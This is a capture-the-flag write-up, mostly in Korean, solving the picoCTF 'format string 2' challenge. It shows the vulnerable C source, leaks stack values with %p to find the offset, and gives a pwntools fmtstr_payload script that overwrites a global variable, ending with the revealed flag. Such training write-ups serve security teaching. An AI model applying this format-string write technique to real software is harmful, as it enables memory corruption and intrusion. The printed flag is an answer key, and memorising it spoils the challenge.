# [format string 2](https://play.picoctf.org/practice/challenge/448?category=6&difficulty=2&page=1)
<br />

**Description:**
> This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!
<br />

**Source Code:**
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=dfe923d97df1df729249ff21202d10ad15d45f4c, for GNU/Linux 3.2.0, not stripped

[*] '/home/kali/pico/format_string_2/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />

# 1. 메모리 유출로 오프셋 구하기
문제에서 제공되는 소스코드를 보면 `printf`의 인자에 `buf`를 사용하는 것을 알 수 있습니다. 이는 FSB 취약점이 발생하며, 내부 주소들이 유출될 수 있습니다. 본 문제의 취지는 해당 취약점을 이용해서 특정 데이터를 바꾸는 것입니다. 따라서 FSB취약점으로 `sus`의 값을 `0x67616c66`로 바꾸면 FLAG를 획득할 수 있습니다.
<br />

우선 포맷 문자열로 입력을 받을 때, 저장되는 시작위치의 오프셋을 알아냅니다.
```bash
$ ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
Here's your input: AAAAAAAA0x7ffebfe913e0.(nil).(nil).(nil).0x400.0x7ffebfe916d0.0x7ffebfe91638.0x3de00ec7.0x7f017e91911c.0x1.0x7ffebfe91700.(nil).(nil).0x4141414141414141.
sus = 0x21737573
You can do better!
```
```bash
$ ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
AAAAAAAA.%14$p
Here's your input: AAAAAAAA.0x4141414141414141
sus = 0x21737573
You can do better!
```
오프셋은 14 입니다.
<br />

```bash
$ readelf -s vuln | grep "sus"
    28: 0000000000404060     4 OBJECT  GLOBAL DEFAULT   25 sus
```
`sus`의 주소는 `0x404060` 입니다. `fmtstr` 함수로 데이터를 쉽게 조작할 수 있습니다.

<br />

```python
from pwn import *

context.arch = "amd64"

p = process("./vuln")
#p = remote("rhea.picoctf.net", 64169)

pay = fmtstr_payload(14, {0x404060:0x67616c66})

p.send(pay)
p.interactive()
```
```bash
$ python3 test.py
[+] Opening connection to rhea.picoctf.net on port 62653: Done
[*] Switching to interactive mode
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
$
Here's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}[*] Got EOF while reading in interactive
$
```



